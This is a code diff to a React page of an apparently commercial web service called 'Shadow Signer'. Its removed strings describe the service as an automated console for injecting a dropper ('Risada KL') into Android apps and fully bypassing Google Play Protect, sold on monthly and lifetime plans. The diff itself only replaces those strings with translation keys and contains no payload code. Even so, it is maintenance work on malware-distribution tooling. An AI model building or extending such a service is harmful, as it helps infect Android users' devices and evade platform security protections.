@@ -4,6 +4,7 @@ import { useSuspenseQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { motion, AnimatePresence } from "framer-motion";
 import { ShieldCheck, Upload, Loader2, Download, AlertTriangle, CheckCircle2, RefreshCcw, Smartphone, Settings, Info, ArrowRight, ShieldAlert } from "lucide-react";
+import { useI18n } from "@/lib/i18n";
 import { SidebarProvider, SidebarInset } from "@/components/ui/sidebar";
 import { AppSidebar } from "@/components/AppSidebar";
 import { Button } from "@/components/ui/button";
@@ -29,6 +30,7 @@ export const Route = createFileRoute("/_authenticated/play-protect")({
 });
 
 function PlayProtectPage() {
+  const { t } = useI18n();
   const queryClient = useQueryClient();
   const getJobs = useServerFn(getMyBuildJobs);
   const createJob = useServerFn(createBuildJob);
@@ -148,8 +150,8 @@ function PlayProtectPage() {
       <div className="client-enterprise flex min-h-screen w-full">
         <AppSidebar isAdmin={isAdmin} />
         <SidebarInset className="min-w-0 flex-1">
-          <header className="sticky top-0 z-30 flex h-14 items-center gap-3 border-b border-border/60 bg-background/80 px-4 backdrop-blur-md">
-            <div className="osint-label text-primary/80">Shadow Signer (Play Protect Bypass)</div>
+            <header className="sticky top-0 z-30 flex h-14 items-center gap-3 border-b border-border/60 bg-background/80 px-4 backdrop-blur-md">
+            <div className="osint-label text-primary/80">{t("pp.title" as any)}</div>
           </header>
 
           <main className="mx-auto w-full max-w-5xl px-4 py-8 sm:px-6">
@@ -158,12 +160,12 @@ function PlayProtectPage() {
               animate={{ opacity: 1, y: 0 }}
               className="mb-8"
             >
-              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">Shadow Signer (Public Builder)</h1>
-              <p className="mt-2 text-muted-foreground">O console automatizado para injeção de dropper (Risada KL) e bypass total do Play Protect.</p>
+              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">{t("pp.header" as any)}</h1>
+              <p className="mt-2 text-muted-foreground">{t("pp.desc" as any)}</p>
               {!hasAccess && (
                 <div className="mt-4 flex items-center gap-2 rounded border border-amber-500/30 bg-amber-500/10 p-3 text-xs text-amber-200/90">
                   <AlertTriangle className="h-4 w-4 text-amber-500" />
-                  Este recurso está disponível apenas para clientes com plano Mensal (4.5.7) ou Vitalício (4.6).
+                  {t("pp.no_access" as any)}
                 </div>
               )}
             </motion.div>
